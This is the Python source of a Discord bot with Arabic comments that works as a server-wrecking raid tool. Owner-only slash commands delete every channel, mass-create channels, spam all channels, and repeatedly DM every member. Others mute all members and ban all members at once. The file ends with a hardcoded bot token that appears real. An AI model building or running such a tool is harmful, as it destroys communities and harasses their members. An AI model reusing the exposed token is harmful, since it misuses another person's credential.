import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
OWNER_ID = 1377796809170354336  # << حط الآيدي تبعك هنا

def is_owner(interaction: discord.Interaction):
    return interaction.user.id == OWNER_ID

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

# ✅ تغيير اسم وصورة السيرفر
@bot.tree.command(name="تغيير_شكل_السيرفر", description="تغيير اسم وصورة السيرفر 🖼️📝")
@app_commands.check(is_owner)
@app_commands.describe(name="الاسم الجديد", image_url="رابط الصورة الجديدة")
async def change_server(interaction: discord.Interaction, name: str, image_url: str):
    await interaction.response.send_message("🔄 يتم تغيير شكل السيرفر...", ephemeral=True)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status == 200:
                    img = await resp.read()
                    await interaction.guild.edit(name=name, icon=img)
                    await interaction.followup.send("✅ تم تغيير شكل السيرفر!", ephemeral=True)
                else:
                    await interaction.followup.send("❌ لم أتمكن من تحميل الصورة.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ حدث خطأ: {e}", ephemeral=True)

# ✅ حذف كل الرومات
@bot.tree.command(name="حذف_الرومات", description="🧨 حذف جميع الرومات")
@app_commands.check(is_owner)
async def delete_channels(interaction: discord.Interaction):
    await interaction.response.send_message("🚨 يتم حذف كل الرومات...", ephemeral=True)
    for channel in interaction.guild.channels:
        try:
            await channel.delete()
        except:
            pass

# ✅ إنشاء رومات جديدة
@bot.tree.command(name="انشاء_رومات", description="📁 إنشاء عدد معين من الرومات")
@app_commands.check(is_owner)
@app_commands.describe(name="اسم الروم", amount="كم عدد الرومات")
async def create_channels(interaction: discord.Interaction, name: str, amount: int):
    await interaction.response.send_message(f"📁 يتم إنشاء {amount} روم باسم {name}...", ephemeral=True)
    for _ in range(amount):
        await interaction.guild.create_text_channel(name)

# ✅ إرسال إلى كل الرومات
@bot.tree.command(name="ارسال", description="📢 إرسال رسالة إلى جميع الرومات")
@app_commands.check(is_owner)
@app_commands.describe(message="الرسالة", repeat="كم مرة ترسل", delay="كل كم ثانية ترسل")
async def spam_all(interaction: discord.Interaction, message: str, repeat: int, delay: float):
    await interaction.response.send_message("🗨️ يتم إرسال الرسائل...", ephemeral=True)
    for _ in range(repeat):
        for channel in interaction.guild.text_channels:
            try:
                await channel.send(message)
            except:
                pass
        await asyncio.sleep(delay)

# ✅ إرسال خاص لكل الأعضاء
@bot.tree.command(name="ارسال_خاص", description="✉️ إرسال رسالة خاصة لكل الأعضاء")
@app_commands.check(is_owner)
@app_commands.describe(message="الرسالة", repeat="كم مرة ترسل", delay="كل كم ثانية ترسل")
async def dm_all(interaction: discord.Interaction, message: str, repeat: int, delay: float):
    await interaction.response.send_message("✉️ يتم إرسال الرسائل الخاصة...", ephemeral=True)
    for _ in range(repeat):
        for member in interaction.guild.members:
            if not member.bot and member.id != interaction.user.id:
                try:
                    await member.send(message)
                except:
                    pass
        await asyncio.sleep(delay)

# ✅ كتم كل الأعضاء عن طريق رتبة
@bot.tree.command(name="كتم_الكل", description="🔇 كتم كل الأعضاء بواسطة رتبة Muted")
@app_commands.check(is_owner)
async def mute_all(interaction: discord.Interaction):
    await interaction.response.send_message("🔇 يتم كتم الجميع...", ephemeral=True)
    guild = interaction.guild

    muted_role = discord.utils.get(guild.roles, name="Muted")
    if not muted_role:
        muted_role = await guild.create_role(name="Muted", reason="🔇 إنشاء رتبة الكتم")

    for channel in guild.channels:
        try:
            await channel.set_permissions(muted_role, send_messages=False, speak=False)
        except:
            pass

    count = 0
    for member in guild.members:
        if not member.bot and member.id != interaction.user.id:
            try:
                await member.add_roles(muted_role, reason="كتم عام")
                count += 1
            except:
                continue

    # ✅ إرسال النتيجة في الخاص بدل العام
    try:
        await interaction.user.send(f"🔇 تم كتم `{count}` عضو.")
    except discord.Forbidden:
        await interaction.followup.send("❌ ما قدرت أرسل لك في الخاص، افتح الخاص من إعدادات الديسكورد.", ephemeral=True)


# ✅ تبنيد كل الأعضاء
@bot.tree.command(name="تبنيد_الكل", description="🚫 تبنيد جميع الأعضاء (مرة وحدة)")
@app_commands.check(is_owner)
async def ban_all(interaction: discord.Interaction):
    await interaction.response.send_message("🚫 يتم تبنيد الجميع...", ephemeral=True)
    for member in interaction.guild.members:
        if member.id != interaction.user.id and not member.bot:
            try:
                await member.ban(reason="تم التبنيد من البوت")
            except:
                pass

# ✅ تبنيد عضو بالآيدي
@bot.tree.command(name="تبنيد_بالايدي", description="🆔 تبنيد شخص باستخدام ID")
@app_commands.check(is_owner)
@app_commands.describe(user_id="آيدي الشخص")
async def ban_by_id(interaction: discord.Interaction, user_id: str):
    await interaction.response.send_message("🆔 يتم التبنيد باستخدام ID...", ephemeral=True)
    try:
        await interaction.guild.ban(discord.Object(id=int(user_id)), reason="تبنيد خارجي")
        await interaction.followup.send("✅ تم تبنيد الشخص بالآيدي!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ فشل التبنيد: {e}", ephemeral=True)

bot.run("MTM4NjIxMDkxMzM1NDI1MjM1OQ.Gs9Bym.QX-j_CgzSET9FMcPs85Lc1AYLePDe_uNZEw4Eg")
